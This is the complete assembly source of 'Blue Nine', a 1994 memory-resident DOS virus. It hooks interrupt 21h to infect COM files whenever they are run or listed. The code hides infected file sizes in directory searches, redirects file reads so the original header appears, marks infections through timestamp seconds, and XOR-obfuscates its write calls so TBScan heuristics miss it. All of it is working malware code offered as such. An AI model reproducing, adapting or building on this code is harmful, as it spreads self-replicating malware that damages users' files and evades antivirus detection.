; The Blue Nine virus... (c) 94 Conzouler

; Resident in conventional memory
; Com infection on load and execute
; Com infection on 11/12 (dir for short - TU)
; Size stealth on 11/12
; Size stealth on 4E/4F
; Infection check: seconds=4
; Installation check: get dos version with cx=666
; Redirection stealth on 3D/3F
; No TBScan flags (by hard heuristic as per version 6.26 - TU)

.model tiny
.code
org 100h

parasize equ    ((offset virend - offset start) / 10h) + 1
bytesize equ    parasize*10h

Start:
                db      0E9h            ; Near jmp to ResCheck
                dw      03h

HostStartO      db      0CDh            ; Buffer to save hosthead
HostStartA      dw      09020h          ; int20 + nop

ResCheck:
        push    ax
        ; Perform installation check
        mov     ah, 30h
        mov     cx, 666
        int     21h                     ; Dos would set cx to 0
        cmp     cx, 444                 ; but virus will set to 444
        je      RestoreHost             ; if resident
        cmp     al, 03h                 ; Don't go resident
        jb      RestoreHost             ; If dosver less than 3.00

Install:
        ; Code to place virus in memory
        mov     bx, es                  ; Dec es to get MCB
        dec     bx
        mov     es, bx

        mov     bx, es:[3]              ; Get size of MB and dec it
        push    cs
        pop     es
        sub     bx, parasize+2
        mov     ah, 4Ah
        int     21h

        mov     ah, 48h                 ; Allocate MB to virus
        mov     bx, parasize+1
        int     21h

        dec     ax                      ; Put MCB in es:0
        mov     es, ax
        mov     word ptr es:[1], 08     ; Change owner to system

        push    word ptr ds:[101h]      ; Get delta offset
        pop     si
        add     si, 103h                ; Get jmp pos

        mov     di, 16h                 ; Move virus to new block
        mov     cx, bytesize-6
        rep     movsb

        sub     ax, 0Fh                 ; Jmp to new block
        push    ax
        mov     ax, offset InstVec
        push    ax
        retf


Org21:
                db      0EAh            ; Far abs jmp
o21             label
Org21ofs        dw      ?
Org21seg        dw      ?


InstVec:
        ; Code to install virus in vector21
        mov     ax, 3521h               ; Save org21
        int     21h
        mov     cs:Org21ofs, bx
        mov     bx, es
        mov     cs:Org21seg, bx

        mov     ax, 2125h               ; Set Vector21
        xchg    ah, al
        push    ds
        push    cs
        pop     ds
        mov     dx, offset Vector21
        int     21h
        pop     ds


RestoreHost:
        mov     si, ds:[101h]           ; Get addr from jmp opc
        add     si, 100h                ; addr to hoststarto
        mov     ah, ds:[si]             ; Restore hosthead
        mov     ds:[100h], ah
        inc     si
        mov     ax, ds:[si]
        mov     ds:[101h], ax
        pop     ax
        push    ds                      ; Set es to host cs
        pop     es
        push    ds                      ; Save host address
        mov     bx, 100h
        push    bx
        retf

icheck:                                 ; Installation check
        cmp     cx, 666
        jne     Org21
        mov     cx, 444
        retf    2

Vector21:
        cmp     ah, 30h                 ; Installation check?
        jne     chn1
        jmp     icheck

chn1:   cmp     ax, 4B00h               ; Load and execute?
        jne     chn2
        call    cominfect

chn2:   cmp     ah, 11h                 ; find first/next (fcb)?
        je      fff
        cmp     ah, 12h
        jne     chn3
fff:    call    dos
        cmp     al, 0FFh
        je      chn3
        jmp     fcbsearch

chn3:   cmp     ah, 4Eh                 ; find first handle?
        jne     chn4
        call    dos
        jnc     found
        retf    2
chn4:   cmp     ah, 4Fh                 ; find next handle?
        jne     chn5
        call    dos
        jnc     found
        retf    2
found:  jmp     hdlsearch

chn5:   cmp     ah, 3Dh                 ; open handle?
        jne     chn6
        call    dos
        jnc     opened
        retf    2
opened: jmp     hdlopen

chn6:   cmp     ah, 3Fh                 ; read from handle
        jne     chnx
        jmp     hdlread

chnx:   jmp     Org21                   ; Chain to dos


        db      '   תש-  Blue Nine Virus by Conzouler 1994  -שת   '


cominfect       proc
        push    ax
        push    bx
        push    cx
        push    dx
        push    ds

        mov     ax, 3d82h
        call    dos
        jc      ciexit
        mov     bx, ax

        call    appendcom
ciexit:
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        ret
cominfect       endp


appendcom       proc
        ; infects the file handle in bx

        mov     ax, 5700h               ; Get date time
        call    dos
        and     cx, 0FFE0h              ; Mask seconds
        or      cx, 02h                 ; Set to 4
        push    cx                      ; Store date time
        push    dx

        push    cs                      ; Read head
        pop     ds
        mov     dx, offset HostStartO
        mov     ah, 3Fh
        mov     cx, 03
        call    dos

        push    word ptr HostStartO
        pop     dx
        xchg    dh, dl
        cmp     dx, 'MZ'                ;Check if .exe
        je      apcomexit

        mov     dx, HostStartA          ; Infection check
        add     dx, 3                   ; Seek to jmp loc
        xor     cx, cx
        mov     ax, 4200h
        call    Dos
        mov     ah, 3Fh                 ; Read 2 bytes
        mov     cx, 2h
        mov     dx, offset Start
        call    dos
        mov     ax, 0b450h
        cmp     word ptr Start, ax      ; infected?
        je      apcomexit

        mov     al, 02h                 ; Goto eof
        call    fseek

        mov     byte ptr ds:[100h], 0E9h; Assemble jmp
        mov     ds:[101h], ax           ; jmp to eof + 3

        mov     dx, offset HostStartO   ; Append virus
        mov     ah, 40h xor 66
        xor     ah, 66
        mov     cx, bytesize-3
        call    dos

        mov     al, 00h                 ; Goto start
        call    fseek

        mov     ah, 40h xor 66          ; Write jmp
        xor     ah, 66
        mov     dx, 100h
        mov     cx, 3
        call    dos

apcomexit:
        pop     dx                      ; Set date
        pop     cx
        mov     ax, 5701h
        call    dos

        mov     ah, 3Eh                 ; Close file
        call    dos

        ret
appendcom       endp


fcbsearch:
        ; called after successful find first/next on fcb
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        call    getdta

        lodsb                           ; extended fcb?
        cmp     al, 0FFh
        jne     normfcb
        add     si, 7
normfcb:
        mov     di, si
        add     si, 8                   ; to extension
        lodsw
        cmp     ax, 'OC'                ; is almost com?
        jne     fcbnocom
        lodsb
        cmp     al, 'M'                 ; is definitely com?
        jne     fcbnocom

        add     si, 0Bh                 ; Get time stamp
        lodsb
        and     al, 1Fh                 ; Mask seconds
        cmp     al, 2                   ; infected?
        jne     fcbnotinfc
        add     si, 5                   ; size-stealth
        sub     ds:[si], bytesize-3

        jmp     fcbexit

fcbnotinfc:                             ; infect file
        in      al, 41h                 ; Get timer (rnd)
        and     al, 03h
        cmp     al, 03h
        jne     fcbexit                 ; Good guy today?

        push    cs                      ; Convert to asciz
        pop     es
        mov     si, di
        mov     di, offset virend
        push    di
        mov     cx, 8
loop3:  lodsb
        cmp     al, ' '
        je      loopx
        stosb
        loop    loop3
loopx:  mov     ax, 'C.'
        stosw
        mov     ax, 'MO'
        stosw
        mov     al, 0
        stosb
        pop     dx
        push    es
        pop     ds
        mov     ax, 3D82h
        call    dos
        jc      fcbexit
        mov     bx, ax
        call    appendcom
fcbnocom:
fcbexit:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        retf    2                       ; Back to caller


hdlsearch:
        ; Called on successful find first/next on handle

        pushf
        push    ax
        push    cx
        push    si
        push    di
        push    ds
        push    es

        call    getdta                  ; dta to es:si and ds:si
        mov     di, si

        add     di, 1Eh                 ; di to name
        mov     cx, 9
        mov     al, '.'
        repne   scasb                   ; scan for extension
        jne     hdlexit
        xchg    si, di
        lodsw
        cmp     ax, 'OC'                ; check if com?
        jne     hdlexit
        lodsb
        cmp     al, 'M'                 ; is com?
        jne     hdlexit

        xchg    si, di                  ; check date
        add     si, 16h                 ; si to time
        lodsb
        and     al, 1Fh                 ; mask seconds
        cmp     al, 02h                 ; seconds=4?
        jne     hdlexit
        sub     word ptr [si+3], bytesize-3 ; Size stealth

hdlexit:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     cx
        pop     ax
        popf
        retf    2


hdlopen:
        ; called after successful file open
        pushf
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        mov     bx, ax                  ; Get sft number
        call    getsft                  ; sft to ds:si and es:di
        jc      hoexit

        add     si, 28h                 ; extension to ds:si
        lodsw
        cmp     ax, 'OC'                ; is com?
        jne     hoexit
        lodsb
        cmp     al, 'M'                 ; sure?
        jne     hoexit

        sub     si, 1Eh                 ; check time
        lodsw
        and     al, 1Fh                 ; mask seconds
        cmp     al, 02h                 ; infected?
        jne     hoexit

        add     di, 05h                 ; Mark infection in sft
        or      word ptr [di], 4000h
        add     di, 0Ch                 ; Change size in sft
        mov     dx, [di]

        sub     dx, bytesize-3
        xor     cx, cx
        mov     ax, 4200h
        call    dos

        mov     ah, 3Fh                 ; Load header
        mov     dx, si
        sub     dx, 02h
        mov     cx, 3
        call    dos
        mov     al, 0
        call    fseek
        mov     byte ptr [si+1], 31

        sub     word ptr [di], bytesize-3

hoexit: pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        popf
        retf    2


hdlread:
        ; called before a read from handle (3F)
        push    si
        push    di
        push    es
        push    cx
        push    dx
        push    ds

        call    getsft                  ; check if marked in sft
        jc      hrnoti

        add     si, 05h
        lodsw
        and     ah, 40h
        cmp     ah, 40h                 ; redirect?
        jne     hrnoti
        cmp     byte ptr [si+9], 31     ; redirect?
        jne     hrnoti

        mov     ax, [si+0Eh]            ; Get offset and
        cmp     ax, 02h                 ; redirect only if it is
        ja      hrnoti                  ; in the first 3 bytes of file

        mov     cx, 3                   ; See how many bytes to redir
        sub     cx, ax

        add     si, 6                   ; offset to time/date field
        pop     es                      ; es to buffer
        push    cx                      ; save redir count
        mov     di, dx
        rep     movsb                   ; move header to buffer

        mov     ax, 4201h               ; Skip 3 bytes
        xor     cx, cx
        pop     dx
        push    dx
        call    dos

        pop     di
        pop     dx
        pop     cx
        push    dx
        add     dx, di
        sub     cx, di
        push    es
        pop     ds
        mov     ah, 3Fh
        call    dos
        add     ax, di
        pop     dx
        pop     es
        pop     di
        pop     si
        retf    2


hrnoti: pop     ds                      ; perform normal read
        pop     dx
        pop     cx
        pop     es
        pop     di
        pop     si
        mov     ah, 3Fh
        call    dos
        retf    2



getdta  proc
        push    bx
        mov     ah, 2Fh                 ; Get dta
        call    dos
        push    es                      ; ds:si to dta
        pop     ds
        mov     si, bx
        pop     bx
getdta  endp


fseek   proc
        mov     ah, 42h
        xor     cx, cx
        xor     dx, dx
        call    dos
        ret
fseek   endp


getsft  proc
        push    bx
        mov     ax, 1220h xor 666
        xor     ax, 666
        int     2Fh
        jc      gsftexit
        cmp     byte ptr es:[di], 0FFh  ; Invalid handle?
        je      gsftexit

        xor     bx, bx                  ; Get sft address
        mov     bl, es:[di]             ; sft to bx
        mov     ax, 1216h xor 666
        xor     ax, 666
        int     2Fh
        jc      gsftexit                ; ok?
        push    es
        pop     ds
        mov     si, di                  ; sft-address to ds:si
        pop     bx
        clc
        ret
gsftexit:
        pop     bx
        stc
        ret
getsft  endp


dos     proc
        pushf
        call    dword ptr cs:o21
        ret
dos     endp

virend:
end start

